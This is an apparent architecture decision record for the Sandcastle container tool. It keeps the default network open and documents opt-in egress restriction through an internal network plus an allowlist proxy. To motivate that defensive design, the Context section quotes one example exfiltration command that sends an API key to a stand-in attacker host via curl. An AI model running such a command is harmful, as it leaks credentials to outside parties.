# Egress control: default network posture stays open

## Context

A subverted agent (prompt injection, malicious dependency) can try to exfiltrate the tokens and source it can see — `curl attacker.com/?t=$ANTHROPIC_API_KEY` is the canonical example. Restricting the container's outbound network is the control that blocks this. Sandcastle already emits `--network` for the bind-mount providers (Docker, Podman), so the mechanism exists; the open question was what the **default** posture should be.

The hard constraint: the agent calls `api.anthropic.com` directly over the container's network, and legitimate runs also reach git hosts and package registries. A blanket outbound blackout does not merely harden the agent — it kills it. So "secure by default = no egress" is not available without breaking honest runs out of the box.

The `network` option already accepts a string or string array and passes each through as a `--network` flag. `network: "none"` maps to Docker/Podman's built-in no-network mode. When `network` is omitted, the default bridge network NATs outbound traffic, so the agent reaches everything it needs with no configuration.

## Decision

**The default egress posture stays open — the default bridge network, with loud documentation — rather than tightened.** Egress restriction is opt-in and is the documented recommendation for untrusted work.

- **Omitted `network` (default):** default bridge network. Agent reaches `api.anthropic.com`, git hosts, and registries out of the box. Nothing breaks.
- **`network: "<custom>"` (the egress lever):** attach the container to an **internal** Docker network (no gateway out) plus a filtering **forward-proxy** that is the only thing allowed out and permits only the agent's real endpoints; point the agent at it with `env: { HTTP_PROXY, HTTPS_PROXY, NO_PROXY }`. This is what blocks `curl attacker.com` while keeping the agent alive. Sandcastle ships the knob and a worked recipe, **not** a bundled proxy.
- **`network: "none"`:** fully offline. Documented as the degenerate case — usable only for tasks that make no model calls, no installs, and no remote git. Not a general default.

Custom/proxy networks and `network: "none"` are **not** gated by `allowDangerousHostAccess` (see ADR-adjacent h06 work) — restricting egress is not a host-access escape hatch. Only `network: "host"` is.

Rejected alternatives:

- **Default to `network: "none"` (secure-by-default, offline).** Rejected: it breaks the agent itself — no model calls — so every real user would immediately override it, training operators to reach for a broad override rather than the scoped allowlist. A default that everyone must disable protects no one and teaches the wrong reflex.
- **Default to a bundled allowlist proxy.** Rejected: bundling a proxy is out of scope per the spec, ties Sandcastle to a specific proxy implementation and endpoint list, and would break in air-gapped or custom-registry environments. The allowlist endpoints are deployment-specific; the operator is the right owner. We ship the recipe instead.

## Consequences

- Pre-1.0, shipped as a `minor` changeset (new documented capability, no behavior change to existing runs).
- **No new networking code.** The `--network` knob is already emitted; proxy env vars flow through the existing `env` injection. This ticket is a decision record + documentation + run-line flag tests.
- Trust model is explicit: the open default is a deliberate, documented choice, not an oversight. Operators running untrusted work are pointed at the one-line allowlist-proxy recipe as the recommendation.
- The README carries an "Egress control" section with the recipe and the `network: "none"` limitation; the `network` JSDoc on both providers names it as the egress lever.
